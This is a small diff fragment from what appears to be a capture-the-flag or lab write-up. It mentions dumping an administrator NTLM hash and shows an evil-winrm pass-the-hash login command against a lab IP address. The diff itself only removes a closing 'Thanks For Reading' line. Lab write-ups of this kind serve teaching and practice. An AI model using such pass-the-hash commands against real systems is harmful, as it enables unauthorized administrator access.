@@ -158,5 +158,3 @@ Dumping this revels administrator NTLM hash. Now i can crack the hash or use ```
 ```
 ./evil-winrm.rb -i 10.10.225.20 -u Administrator -H (HASH HERE PLEASE)
 ```
-
-# Thanks For Reading
